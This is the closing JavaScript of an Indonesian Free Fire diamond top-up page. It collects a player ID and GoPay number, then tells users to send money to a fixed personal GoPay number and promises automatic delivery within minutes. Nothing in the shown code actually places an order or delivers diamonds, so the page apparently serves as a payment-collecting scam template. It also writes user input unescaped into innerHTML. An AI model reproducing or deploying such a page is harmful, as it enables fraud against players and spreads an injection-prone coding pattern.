    <script>
        // Set current year in footer
        document.getElementById('currentYear').textContent = new Date().getFullYear();
        
        // Memilih paket diamond
        const diamondOptions = document.querySelectorAll('.diamond-option');
        const selectedDiamondInput = document.getElementById('selectedDiamond');
        const selectedPriceInput = document.getElementById('selectedPrice');
        
        diamondOptions.forEach(option => {
            option.addEventListener('click', function() {
                // Hapus selected dari semua opsi
                diamondOptions.forEach(opt => opt.classList.remove('selected'));
                
                // Tambahkan selected ke opsi yang diklik
                this.classList.add('selected');
                
                // Simpan nilai yang dipilih
                const amount = this.getAttribute('data-amount');
                const price = this.getAttribute('data-price');
                
                selectedDiamondInput.value = amount;
                selectedPriceInput.value = price;
            });
        });
        
        // Konfirmasi pembayaran
        const confirmBtn = document.getElementById('confirmBtn');
        const confirmation = document.getElementById('confirmation');
        const transactionDetails = document.getElementById('transactionDetails');
        const paymentInstruction = document.getElementById('paymentInstruction');
        
        confirmBtn.addEventListener('click', function() {
            const playerId = document.getElementById('playerId').value;
            const diamondAmount = selectedDiamondInput.value;
            const price = selectedPriceInput.value;
            const gopayNumber = document.getElementById('gopayNumber').value;
            
            if (!playerId) {
                alert('Masukkan ID Free Fire Anda terlebih dahulu!');
                return;
            }
            
            if (!diamondAmount) {
                alert('Pilih jumlah diamond terlebih dahulu!');
                return;
            }
            
            if (!gopayNumber) {
                alert('Masukkan nomor GoPay Anda terlebih dahulu!');
                return;
            }
            
            // Generate timestamp
            const now = new Date();
            const formattedDate = now.toLocaleDateString('id-ID', {
                weekday: 'long',
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            });
            const formattedTime = now.toLocaleTimeString('id-ID', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            // Format price with thousand separators
            const formattedPrice = parseInt(price).toLocaleString('id-ID');
            
            // Create transaction details
            transactionDetails.innerHTML = `
                <div class="detail-row">
                    <span class="detail-label">ID Free Fire:</span>
                    <span class="detail-value">${playerId}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Jumlah Diamond:</span>
                    <span class="detail-value">${diamondAmount} Diamond</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Nominal Pembayaran:</span>
                    <span class="detail-value">Rp ${formattedPrice}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Nomor GoPay Anda:</span>
                    <span class="detail-value">${gopayNumber}</span>
                </div>
                <div class="timestamp">
                    Transaksi pada: ${formattedDate}, ${formattedTime}
                </div>
            `;
            
            // Create payment instruction
            paymentInstruction.innerHTML = `
                <h3 style="margin-top: 0; color: #FF5722;">Instruksi Pembayaran:</h3>
                <p>1. Buka aplikasi GoPay di ponsel Anda</p>
                <p>2. Masukkan nomor tujuan: <strong>+628889013026</strong></p>
                <p>3. Masukkan nominal: <strong>Rp ${formattedPrice}</strong></p>
                <p>4. Tambahkan catatan: <strong>TopUpFF-${playerId}</strong></p>
                <p>5. Konfirmasi pembayaran</p>
                
                <div class="gopay-qr">
                    <p>Atau scan QR Code berikut:</p>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=gopay://payment?amount=${price}&recipient=628889013026&notes=TopUpFF-${playerId}" alt="QR Code GoPay">
                </div>
                
                <p style="margin-top: 15px; font-weight: bold;">Setelah pembayaran berhasil, diamond akan otomatis masuk ke akun Anda dalam 1-5 menit.</p>
            `;
            
            // Tampilkan pesan konfirmasi
            confirmation.style.display = 'block';
            
            // Scroll ke pesan konfirmasi
            confirmation.scrollIntoView({ behavior: 'smooth' });
            
            // Auto reset form after 10 minutes (optional)
            setTimeout(() => {
                document.getElementById('topupForm').reset();
                diamondOptions.forEach(opt => opt.classList.remove('selected'));
                // confirmation.style.display = 'none'; // Optional: hide confirmation
            }, 600000); // 10 minutes
        });
    </script>
</body>
